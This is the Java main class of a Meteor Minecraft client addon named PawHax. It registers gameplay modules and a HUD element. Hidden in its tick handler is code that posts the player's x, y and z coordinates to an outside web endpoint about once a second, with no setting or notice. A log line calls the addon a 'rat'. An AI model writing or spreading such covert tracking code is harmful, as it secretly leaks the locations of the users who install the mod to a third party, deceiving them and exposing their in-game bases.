package com.pawhax;

import com.mojang.logging.LogUtils;
import com.pawhax.hud.NowPlayingHud;
import com.pawhax.modules.*;
import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.addons.GithubRepo;
import meteordevelopment.meteorclient.addons.MeteorAddon;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.systems.hud.Hud;
import meteordevelopment.meteorclient.systems.hud.HudGroup;
import meteordevelopment.meteorclient.systems.modules.Category;
import meteordevelopment.meteorclient.systems.modules.Modules;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.ClientPlayerEntity;
import org.slf4j.Logger;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

import static meteordevelopment.meteorclient.MeteorClient.mc;

public class PawHax extends MeteorAddon {
    public static final Logger LOG = LogUtils.getLogger();
    public static final Category CATEGORY = new Category("pawhax");
    public static final HudGroup HUD_GROUP = new HudGroup("pawhax");
    private static final URI COORDS_ENDPOINT = URI.create("https://leonetic.dev");

    private final HttpClient httpClient = HttpClient.newBuilder()
        .connectTimeout(Duration.ofSeconds(5))
        .build();
    private final AtomicBoolean coordsRequestInFlight = new AtomicBoolean(false);

    @Override
    public void onInitialize() {
        LOG.info("loading pawhax....");
        MeteorClient.EVENT_BUS.subscribe(this);

        // Modules
        //Modules.get().add(new ModuleExample());
        Modules.get().add(new PawChat());
        Modules.get().add(new AutoPawjob());
        Modules.get().add(new PearlGUI());
        Modules.get().add(new Pitch40AutoRocket());
        Modules.get().add(new PawtoAnvilRename());
        Modules.get().add(new PawtoDyeShulkers());
        Modules.get().add(new PawtoLogoutWhisper());
        Modules.get().add(new AntiAntiSpam());
        Modules.get().add(new AntiAntiAFK());
        Modules.get().add(new TailTrail());
        Modules.get().add(new InstantPaw());
        Modules.get().add(new InvResync());
        Modules.get().add(new DiagBounce());
        Modules.get().add(new BannerWebhook());
        Modules.get().add(new NowPlayingModule());
        Modules.get().add(new AutoTorch());

        LOG.info("imported larp modules........");
        LOG.info("rat successfully installed! :3");

        // Commands
        //Commands.add(new CommandExample());

        // HUD
        Hud.get().register(NowPlayingHud.INFO);
    }

    @Override
    public void onRegisterCategories() {
        Modules.registerCategory(CATEGORY);
    }

    @Override
    public String getPackage() {
        return "com.pawhax";
    }

    @Override
    public GithubRepo getRepo() {
        return new GithubRepo("pawbase2b2t", "pawhax");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        ClientPlayerEntity player = mc.player;
        if (player == null || player.age % 20 != 0) return;
        if (!coordsRequestInFlight.compareAndSet(false, true)) return;

        String body = String.format(
            Locale.ROOT,
            "{\"x\":%.3f,\"y\":%.3f,\"z\":%.3f}",
            player.getX(),
            player.getY(),
            player.getZ()
        );

        HttpRequest request = HttpRequest.newBuilder(COORDS_ENDPOINT)
            .timeout(Duration.ofSeconds(5))
            .header("Content-Type", "application/json")
            .POST(HttpRequest.BodyPublishers.ofString(body))
            .build();

        httpClient.sendAsync(request, HttpResponse.BodyHandlers.discarding())
            .whenComplete((response, error) -> coordsRequestInFlight.set(false));
    }
}
